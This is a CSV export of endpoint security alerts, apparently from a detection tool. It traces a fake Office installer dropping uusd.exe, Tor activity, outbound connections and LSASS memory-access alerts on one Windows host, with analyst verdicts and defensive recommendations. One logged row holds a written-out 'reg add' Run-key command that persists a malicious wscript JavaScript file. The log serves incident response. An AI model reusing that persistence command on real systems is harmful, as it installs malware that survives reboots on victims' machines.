Timestamp,Process,Parent Process,Command Line,Detection Type,Risk Score,Investigation Reason,Source IP,Destination IP,Registry Path,File Path,DNS Query,Event Action,PID,MITRE Technique,MITRE Name,Allowlisted,Severity,Confidence,FP Assessment,Analyst Verdict,Recommendation,Alert ID
"Jun 1, 2026 @ 14:24:18.456",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,External Communication | Malware Staging | Network Outlier | Sigma Match,95,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; Outbound to external IP: 96.9.98.205 ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,173.10.254.170,96.9.98.205,,,,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Block destination IP at perimeter; review netflow,AH-2793E4CE
"Jun 1, 2026 @ 14:24:18.402",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,External Communication | Malware Staging | Network Outlier | Sigma Match,95,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; Outbound to external IP: 94.130.10.179 ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,173.10.254.170,94.130.10.179,,,,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Block destination IP at perimeter; review netflow,AH-2FA6B1CC
"Jun 1, 2026 @ 14:24:08.788",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,External Communication | Malware Staging | Network Outlier | Sigma Match,95,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; Outbound to external IP: 95.179.162.106 ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,173.10.254.170,95.179.162.106,,,,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Block destination IP at perimeter; review netflow,AH-BF365E34
"Jun 1, 2026 @ 14:23:19.992",C:\Windows\System32\lsass.exe,,,Sigma Match,90,Unusual process accessing LSASS memory,,,,,ctldl.windowsupdate.com,lookup_requested,992,T1003.001,,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Review matching Sigma rule for context-specific guidance,AH-DF59AB28
"Jun 1, 2026 @ 14:23:20.146",C:\Windows\System32\lsass.exe,,,Sigma Match,90,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\103621DE9CD5414CC2538780B4B75751,,creation,992,T1003.001,,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Review matching Sigma rule for context-specific guidance,AH-649C26CE
"Jun 1, 2026 @ 14:23:20.470",C:\Windows\System32\lsass.exe,,,Sigma Match,90,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\453FD74286E7A811168BF9CC3CB55EB2,,creation,992,T1003.001,,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Review matching Sigma rule for context-specific guidance,AH-6F1662D7
"Jun 1, 2026 @ 14:24:18.082",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\cached-microdesc-consensus.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-F3A26FE5
"Jun 1, 2026 @ 14:24:49.776",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-D1D435A0
"Jun 1, 2026 @ 14:21:18.303",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,80,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\onenote.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\onenotem.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\onenote.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-4ADFAF1F
"Jun 1, 2026 @ 14:24:04.305",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-7088201D
"Jun 1, 2026 @ 14:24:15.348",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\unverified-microdesc-consensus.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-3290448C
"Jun 1, 2026 @ 14:24:18.012",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\unverified-microdesc-consensus,,deletion,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-3FF36FD4
"Jun 1, 2026 @ 14:24:15.351",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\unverified-microdesc-consensus,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-8CDE67A5
"Jun 1, 2026 @ 14:24:15.825",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\cached-certs.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-CAFBDA2F
"Jun 1, 2026 @ 14:24:34.224",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\cached-microdescs.new,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-0F8FB670
"Jun 1, 2026 @ 14:22:04.649",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,microsoft-365-16-0-19725-20152.exe RELAUNCHED ,Malware Staging | Rare Parent-Child | Sigma Match,80,Rare process pair: microsoft-365-16-0-19725-20152.exe->microsoft-365-16-0-19725-20152.exe ; Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"33,012",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-0872E047
"Jun 1, 2026 @ 14:24:15.846",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\cached-certs,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-65573E81
"Jun 1, 2026 @ 14:22:04.927",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,C:\Windows\explorer.exe,"""C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe"" ",Malware Staging | Rare Parent-Child | Sigma Match,80,Rare process pair: explorer.exe->microsoft-365-16-0-19725-20152.exe ; Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"26,752",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-1FFBAB2B
"Jun 1, 2026 @ 14:24:49.769",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state,,deletion,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-F7F7E68E
"Jun 1, 2026 @ 14:24:49.767",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-52283868
"Jun 1, 2026 @ 14:21:16.772",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,80,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\clview.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\graph.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clview.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-D0825639
"Jun 1, 2026 @ 14:22:02.433",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,"""C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe"" ELEVATED sid=S-1-5-21-3330616437-3750286687-2521933251-1001 RELAUNCHED ",Malware Staging | Rare Parent-Child | Sigma Match,80,Rare process pair: microsoft-365-16-0-19725-20152.exe->microsoft-365-16-0-19725-20152.exe ; Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"25,088",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-B8CB7B65
"Jun 1, 2026 @ 14:24:03.255",C:\Users\Public\Pictures\kelotopu\uusd.exe,C:\Windows\System32\wscript.exe,"""C:\Users\Public\Pictures\kelotopu\uusd.exe"" ",Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,,,start,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-FF635C19
"Jun 1, 2026 @ 14:24:18.086",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\cached-microdesc-consensus,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-583F6C83
"Jun 1, 2026 @ 14:23:25.848",C:\Windows\System32\reg.exe,,,LOLBin Abuse | Persistence | Rare Parent-Child,80,Rare process pair: -->reg.exe ; Living-off-the-land binary: reg.exe ; Persistence registry path: hklm\software\microsoft\windows\currentversion\run\xuvotopo,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\xuvotopo,,,modification,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-9A816A30
"Jun 1, 2026 @ 14:24:48.323",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-226BB071
"Jun 1, 2026 @ 14:24:48.327",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state,,deletion,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-EF54AC35
"Jun 1, 2026 @ 14:24:04.303",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-A2F547FF
"Jun 1, 2026 @ 14:24:48.334",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-7A763644
"Jun 1, 2026 @ 14:21:40.978",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,75,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF09945451CA6B549B.TMP,,deletion,"5,516",T1218,,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-6F60B70B
"Jun 1, 2026 @ 14:23:22.935",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,LOLBin Abuse | Rare Parent-Child | Suspicious User-Agent / Tool,70,Rare process pair: windowsterminal.exe->powershell.exe ; Living-off-the-land binary: powershell.exe ; Tool signature in user-agent/command: powershell,,,,,,end,"7,884",T1059.001,PowerShell,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-2471283C
"Jun 1, 2026 @ 14:23:25.346",C:\Windows\System32\reg.exe,C:\Users\DELL\office_portable_x3.exe,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C:\Users\Public\Pictures\kelotopu\xuvotopo.js\"""" /f",LOLBin Abuse | Sigma Match,70,Living-off-the-land binary: reg.exe ; reg.exe adding a Run key entry,,,,,,start,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-95B6821C
"Jun 1, 2026 @ 14:23:25.852",C:\Windows\System32\reg.exe,C:\Users\DELL\office_portable_x3.exe,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C:\Users\Public\Pictures\kelotopu\xuvotopo.js\"""" /f",LOLBin Abuse | Sigma Match,70,Living-off-the-land binary: reg.exe ; reg.exe adding a Run key entry,,,,,,end,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-F99FA65F
"Jun 1, 2026 @ 14:21:37.792",C:\Windows\System32\msiexec.exe,C:\Windows\System32\services.exe,C:\Windows\system32\msiexec.exe /V,LOLBin Abuse | PowerShell Payload | Rare Parent-Child,65,Rare process pair: services.exe->msiexec.exe ; Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"5,516",T1218,PowerShell,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-CECAAECE
"Jun 1, 2026 @ 14:23:20.968",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\xuvotopo.js,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F58331E7
"Jun 1, 2026 @ 14:23:20.794",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\cinfo.inf,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B5EF69CC
"Jun 1, 2026 @ 14:23:19.636",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\002a.txt,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2475A48C
"Jun 1, 2026 @ 14:23:19.389",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\002w.txt,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2654B171
"Jun 1, 2026 @ 14:23:19.383",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\uusd.exe,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6A88A6C1
"Jun 1, 2026 @ 14:23:17.642",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\GUID,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6DC90984
"Jun 1, 2026 @ 14:23:05.906",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-8A0C21C1
"Jun 1, 2026 @ 14:22:58.483",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_bz2.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-494F80A1
"Jun 1, 2026 @ 14:22:56.885",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,start,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6F9F9BAD
"Jun 1, 2026 @ 14:22:58.487",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_ctypes.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B053B5BE
"Jun 1, 2026 @ 14:22:58.479",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\VCRUNTIME140.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-AF5B0E5E
"Jun 1, 2026 @ 14:22:58.481",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\VCRUNTIME140_1.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2EE44A41
"Jun 1, 2026 @ 14:22:04.607",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\OTele\microsoft-365-16-0-19725-20152.exe.db-wal,,deletion,"33,012",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-3525F875
"Jun 1, 2026 @ 14:22:00.241",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\DESKTOP-MPJ4I7R-20260601-1416a.log,,overwrite,"25,088",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-354AC228
"Jun 1, 2026 @ 14:22:02.458",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\DESKTOP-MPJ4I7R-20260601-1416.log,,overwrite,"33,012",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-AD8B6C15
"Jun 1, 2026 @ 14:22:04.604",C:\Users\DELL\Downloads\microsoft-365-16-0-19725-20152.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\downloads\microsoft-365-16-0-19725-20152.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\OTele\microsoft-365-16-0-19725-20152.exe.db-shm,,deletion,"33,012",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-8BB5EA4B
"Jun 1, 2026 @ 14:23:27.250",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\libcrypto-3.dll,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6F319CEC
"Jun 1, 2026 @ 14:23:27.246",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\uusd.exe,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-4FA2F109
"Jun 1, 2026 @ 14:23:27.255",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\psutil\_psutil_windows.pyd,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-63E98772
"Jun 1, 2026 @ 14:23:27.264",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\unicodedata.pyd,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-C63C7E6E
"Jun 1, 2026 @ 14:23:27.260",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\python313.dll,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B0079A45
